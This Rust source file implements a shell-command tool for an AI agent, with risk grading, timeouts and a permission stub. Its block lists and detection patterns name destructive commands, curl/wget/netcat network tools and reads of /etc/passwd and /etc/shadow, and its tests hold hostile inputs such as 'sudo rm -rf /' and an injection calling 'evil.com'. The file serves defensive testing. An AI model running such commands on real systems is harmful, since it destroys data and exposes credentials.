//! Enhanced Bash tool implementation
//! Features secure process execution, timeout handling, cross-platform support, and command validation

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use tokio::process::Command;
use tokio::time::{timeout, Duration};
use uuid::Uuid;
use chrono::Utc;
use cfg_if::cfg_if;

use super::{Tool, ToolContext, ToolResult, ToolError};
use super::permission::{RiskLevel, create_permission_request};

/// Tool for executing bash/shell commands
pub struct BashTool;

#[derive(Debug, Deserialize)]
struct BashParams {
    command: String,
    #[serde(default = "default_timeout")]
    timeout: Option<u64>,
    #[serde(default)]
    description: Option<String>,
    #[serde(default)]
    environment: Option<HashMap<String, String>>,
    #[serde(default)]
    working_directory: Option<String>,
}

fn default_timeout() -> Option<u64> {
    Some(120000) // 2 minutes default
}

const MAX_TIMEOUT: u64 = 600_000; // 10 minutes max
const MAX_OUTPUT_LENGTH: usize = 30_000;

// Dangerous commands that should be blocked or require high permissions
const DANGEROUS_COMMANDS: &[&str] = &[
    "rm", "rmdir", "del", "format", "fdisk", "mkfs", "dd", "shutdown", 
    "reboot", "halt", "init", "kill", "killall", "pkill", "sudo", "su", 
    "passwd", "chown", "chmod", "mount", "umount", "systemctl", "service",
    "iptables", "ufw", "firewall-cmd"
];

// Commands that modify system state (medium risk)
const SYSTEM_COMMANDS: &[&str] = &[
    "apt", "yum", "dnf", "pacman", "brew", "pip", "npm", "yarn", "cargo",
    "git", "docker", "kubectl", "terraform", "ansible"
];

#[async_trait]
impl Tool for BashTool {
    fn id(&self) -> &str {
        "bash"
    }
    
    fn description(&self) -> &str {
        "Execute shell commands with security controls and timeout handling"
    }
    
    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute"
                },
                "timeout": {
                    "type": "number",
                    "description": "Optional timeout in milliseconds (max 600000ms / 10 minutes)",
                    "minimum": 1000,
                    "maximum": 600000
                },
                "description": {
                    "type": "string",
                    "description": "Clear, concise description of what this command does in 5-10 words"
                },
                "environment": {
                    "type": "object",
                    "description": "Additional environment variables",
                    "additionalProperties": {
                        "type": "string"
                    }
                },
                "workingDirectory": {
                    "type": "string",
                    "description": "Working directory for the command (relative to session working directory)"
                }
            },
            "required": ["command"]
        })
    }
    
    async fn execute(
        &self,
        args: Value,
        ctx: ToolContext,
    ) -> Result<ToolResult, ToolError> {
        let params: BashParams = serde_json::from_value(args)
            .map_err(|e| ToolError::InvalidParameters(e.to_string()))?;
        
        // Validate and analyze command
        let risk_assessment = self.assess_command_risk(&params.command);
        
        // Security validation
        self.validate_command_security(&params.command, &ctx)?;
        
        // Handle timeout validation
        let timeout_ms = params.timeout.unwrap_or(120_000).min(MAX_TIMEOUT);
        
        // Determine working directory
        let working_dir = if let Some(wd) = &params.working_directory {
            let requested_dir = if PathBuf::from(wd).is_absolute() {
                PathBuf::from(wd)
            } else {
                ctx.working_directory.join(wd)
            };
            
            // Security check: ensure it's within the session working directory
            if !requested_dir.starts_with(&ctx.working_directory) {
                return Err(ToolError::PermissionDenied(
                    "Working directory must be within session directory".to_string()
                ));
            }
            
            requested_dir
        } else {
            ctx.working_directory.clone()
        };
        
        // Create permission request based on risk level
        if risk_assessment.requires_permission {
            let permission_request = create_permission_request(
                Uuid::new_v4().to_string(),
                ctx.session_id.clone(),
                format!("Execute command: {}", 
                    if params.command.len() > 50 { 
                        format!("{}...", &params.command[..50]) 
                    } else { 
                        params.command.clone() 
                    }
                ),
                risk_assessment.risk_level,
                json!({
                    "command": params.command,
                    "description": params.description,
                    "working_directory": working_dir.to_string_lossy(),
                    "risk_factors": risk_assessment.risk_factors,
                }),
            );
            
            // In a full implementation, this would trigger permission checking
            // For now, we'll allow medium risk commands but block high/critical
            if matches!(risk_assessment.risk_level, RiskLevel::High | RiskLevel::Critical) {
                return Err(ToolError::PermissionDenied(format!(
                    "Command blocked due to security policy: {}",
                    risk_assessment.risk_factors.join(", ")
                )));
            }
        }
        
        // Execute the command
        let execution_result = self.execute_command(
            &params.command,
            &working_dir,
            timeout_ms,
            &params.environment,
            &ctx,
        ).await?;
        
        // Process results
        let output = self.format_output(&execution_result)?;
        
        // Calculate relative working directory for display
        let relative_wd = working_dir
            .strip_prefix(&ctx.working_directory)
            .unwrap_or(&working_dir)
            .to_string_lossy()
            .to_string();
        
        let metadata = json!({
            "command": params.command,
            "description": params.description,
            "exit_code": execution_result.exit_code,
            "working_directory": relative_wd,
            "timeout_ms": timeout_ms,
            "stdout_bytes": execution_result.stdout.len(),
            "stderr_bytes": execution_result.stderr.len(),
            "truncated": execution_result.truncated,
            "execution_time_ms": execution_result.execution_time_ms,
            "risk_assessment": risk_assessment,
            "timestamp": Utc::now().to_rfc3339(),
        });
        
        // Check if command failed
        if execution_result.exit_code != 0 {
            return Err(ToolError::ExecutionFailed(format!(
                "Command exited with code {}: {}",
                execution_result.exit_code,
                output
            )));
        }
        
        Ok(ToolResult {
            title: params.description.unwrap_or_else(|| {
                if params.command.len() > 50 {
                    format!("{}...", &params.command[..50])
                } else {
                    params.command.clone()
                }
            }),
            metadata,
            output,
        })
    }
}

#[derive(Debug, Clone, serde::Serialize)]
struct CommandRiskAssessment {
    risk_level: RiskLevel,
    requires_permission: bool,
    risk_factors: Vec<String>,
}

#[derive(Debug)]
struct CommandExecutionResult {
    stdout: String,
    stderr: String,
    exit_code: i32,
    truncated: bool,
    execution_time_ms: u128,
}

impl BashTool {
    /// Assess the risk level of a command
    fn assess_command_risk(&self, command: &str) -> CommandRiskAssessment {
        let mut risk_factors = Vec::new();
        let mut risk_level = RiskLevel::Low;
        let mut requires_permission = false;
        
        let command_lower = command.to_lowercase();
        let command_parts: Vec<&str> = command.split_whitespace().collect();
        let base_command = command_parts.first().unwrap_or(&"").trim_start_matches("sudo ");
        
        // Check for dangerous commands
        if DANGEROUS_COMMANDS.iter().any(|&cmd| base_command == cmd || base_command.ends_with(cmd)) {
            risk_level = RiskLevel::Critical;
            requires_permission = true;
            risk_factors.push("Potentially destructive command".to_string());
        }
        
        // Check for system modification commands
        if SYSTEM_COMMANDS.iter().any(|&cmd| base_command == cmd || base_command.starts_with(cmd)) {
            risk_level = risk_level.max(RiskLevel::Medium);
            requires_permission = true;
            risk_factors.push("System modification command".to_string());
        }
        
        // Check for privilege escalation
        if command_lower.contains("sudo") || command_lower.contains("su ") {
            risk_level = RiskLevel::Critical;
            requires_permission = true;
            risk_factors.push("Privilege escalation detected".to_string());
        }
        
        // Check for network operations
        if command_lower.contains("curl") || command_lower.contains("wget") || 
           command_lower.contains("nc ") || command_lower.contains("netcat") {
            risk_level = risk_level.max(RiskLevel::Medium);
            requires_permission = true;
            risk_factors.push("Network operation".to_string());
        }
        
        // Check for file operations with wildcards
        if (command_lower.contains("rm ") || command_lower.contains("del ")) && 
           (command_lower.contains("*") || command_lower.contains("?")) {
            risk_level = RiskLevel::High;
            requires_permission = true;
            risk_factors.push("Bulk file deletion".to_string());
        }
        
        // Check for shell operators that could be dangerous
        if command.contains("&&") || command.contains("||") || command.contains(";") || 
           command.contains("|") || command.contains(">") || command.contains(">>") {
            risk_level = risk_level.max(RiskLevel::Medium);
            risk_factors.push("Complex shell operation".to_string());
        }
        
        CommandRiskAssessment {
            risk_level,
            requires_permission,
            risk_factors,
        }
    }
    
    /// Validate command security
    fn validate_command_security(&self, command: &str, _ctx: &ToolContext) -> Result<(), ToolError> {
        // Block obviously malicious patterns
        let malicious_patterns = [
            "; rm -rf", "| rm -rf", "&& rm -rf", "|| rm -rf",
            "$(curl", "$(wget", "`curl", "`wget",
            "/etc/passwd", "/etc/shadow", 
            "format c:", "del /f /s /q",
        ];
        
        let command_lower = command.to_lowercase();
        for pattern in &malicious_patterns {
            if command_lower.contains(pattern) {
                return Err(ToolError::PermissionDenied(format!(
                    "Command contains potentially malicious pattern: {}",
                    pattern
                )));
            }
        }
        
        // Check command length
        if command.len() > 4096 {
            return Err(ToolError::InvalidParameters(
                "Command too long (>4096 characters)".to_string()
            ));
        }
        
        Ok(())
    }
    
    /// Execute the command with proper platform handling
    async fn execute_command(
        &self,
        command: &str,
        working_dir: &Path,
        timeout_ms: u64,
        environment: &Option<HashMap<String, String>>,
        ctx: &ToolContext,
    ) -> Result<CommandExecutionResult, ToolError> {
        let start_time = std::time::Instant::now();
        
        // Build command based on platform
        let mut cmd = self.create_platform_command(command);
        
        // Set working directory
        cmd.current_dir(working_dir);
        
        // Set up stdio
        cmd.stdout(Stdio::piped())
           .stderr(Stdio::piped())
           .stdin(Stdio::null());
        
        // Set environment variables
        cmd.env("TERM", "xterm-256color");
        cmd.env("FORCE_COLOR", "0"); // Disable colors in output
        cmd.env("NO_COLOR", "1");
        
        if let Some(env) = environment {
            for (key, value) in env {
                // Validate environment variable names for security
                if key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                    cmd.env(key, value);
                }
            }
        }
        
        // Execute with timeout
        let output = match timeout(Duration::from_millis(timeout_ms), cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return Err(ToolError::ExecutionFailed(format!("Command failed to start: {}", e)));
            }
            Err(_) => {
                return Err(ToolError::ExecutionFailed(format!(
                    "Command timed out after {} ms",
                    timeout_ms
                )));
            }
        };
        
        // Check abort signal
        if *ctx.abort_signal.borrow() {
            return Err(ToolError::Aborted);
        }
        
        let execution_time = start_time.elapsed().as_millis();
        
        // Convert output to strings
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        
        // Check if output needs truncation
        let combined_length = stdout.len() + stderr.len();
        let truncated = combined_length > MAX_OUTPUT_LENGTH;
        
        let (final_stdout, final_stderr) = if truncated {
            let stdout_limit = MAX_OUTPUT_LENGTH * 3 / 4; // 75% for stdout
            let stderr_limit = MAX_OUTPUT_LENGTH - stdout_limit;
            
            let truncated_stdout = if stdout.len() > stdout_limit {
                format!("{}... (truncated)", &stdout[..stdout_limit])
            } else {
                stdout.to_string()
            };
            
            let truncated_stderr = if stderr.len() > stderr_limit {
                format!("{}... (truncated)", &stderr[..stderr_limit])
            } else {
                stderr.to_string()
            };
            
            (truncated_stdout, truncated_stderr)
        } else {
            (stdout.to_string(), stderr.to_string())
        };
        
        Ok(CommandExecutionResult {
            stdout: final_stdout,
            stderr: final_stderr,
            exit_code: output.status.code().unwrap_or(-1),
            truncated,
            execution_time_ms: execution_time,
        })
    }
    
    /// Create platform-appropriate command
    fn create_platform_command(&self, command: &str) -> Command {
        cfg_if! {
            if #[cfg(target_os = "windows")] {
                let mut cmd = Command::new("cmd");
                cmd.args(["/C", command]);
                cmd
            } else {
                let mut cmd = Command::new("bash");
                cmd.args(["-c", command]);
                cmd
            }
        }
    }
    
    /// Format the execution result into a readable output
    fn format_output(&self, result: &CommandExecutionResult) -> Result<String, ToolError> {
        let mut output_parts = Vec::new();
        
        if !result.stdout.is_empty() {
            output_parts.push(format!("<stdout>\n{}\n</stdout>", result.stdout));
        }
        
        if !result.stderr.is_empty() {
            output_parts.push(format!("<stderr>\n{}\n</stderr>", result.stderr));
        }
        
        if output_parts.is_empty() {
            output_parts.push("(no output)".to_string());
        }
        
        if result.truncated {
            output_parts.push("\n(Output truncated due to length)".to_string());
        }
        
        Ok(output_parts.join("\n"))
    }
}

impl RiskLevel {
    fn max(self, other: RiskLevel) -> RiskLevel {
        match (self, other) {
            (RiskLevel::Critical, _) | (_, RiskLevel::Critical) => RiskLevel::Critical,
            (RiskLevel::High, _) | (_, RiskLevel::High) => RiskLevel::High,
            (RiskLevel::Medium, _) | (_, RiskLevel::Medium) => RiskLevel::Medium,
            (RiskLevel::Low, RiskLevel::Low) => RiskLevel::Low,
        }
    }
}

#[cfg(feature = "wasm")]
mod wasm_impl {
    use super::*;
    
    impl BashTool {
        async fn execute_command(
            &self,
            _command: &str,
            _working_dir: &Path,
            _timeout_ms: u64,
            _environment: &Option<HashMap<String, String>>,
            _ctx: &ToolContext,
        ) -> Result<CommandExecutionResult, ToolError> {
            Err(ToolError::ExecutionFailed(
                "Command execution not supported in WASM environment".to_string()
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_risk_assessment() {
        let tool = BashTool;
        
        // Low risk command
        let assessment = tool.assess_command_risk("ls -la");
        assert_eq!(assessment.risk_level, RiskLevel::Low);
        assert!(!assessment.requires_permission);
        
        // Medium risk command
        let assessment = tool.assess_command_risk("git clone https://github.com/user/repo");
        assert_eq!(assessment.risk_level, RiskLevel::Medium);
        assert!(assessment.requires_permission);
        
        // High risk command
        let assessment = tool.assess_command_risk("rm -rf *.log");
        assert_eq!(assessment.risk_level, RiskLevel::High);
        assert!(assessment.requires_permission);
        
        // Critical risk command
        let assessment = tool.assess_command_risk("sudo rm -rf /");
        assert_eq!(assessment.risk_level, RiskLevel::Critical);
        assert!(assessment.requires_permission);
    }
    
    #[test]
    fn test_security_validation() {
        let tool = BashTool;
        let ctx = ToolContext {
            session_id: "test".to_string(),
            message_id: "test".to_string(),
            abort_signal: tokio::sync::watch::channel(false).1,
            working_directory: PathBuf::from("/tmp"),
        };
        
        // Safe command should pass
        assert!(tool.validate_command_security("ls -la", &ctx).is_ok());
        
        // Malicious pattern should fail
        assert!(tool.validate_command_security("ls; rm -rf /", &ctx).is_err());
        
        // Command injection should fail
        assert!(tool.validate_command_security("ls $(curl evil.com)", &ctx).is_err());
    }
}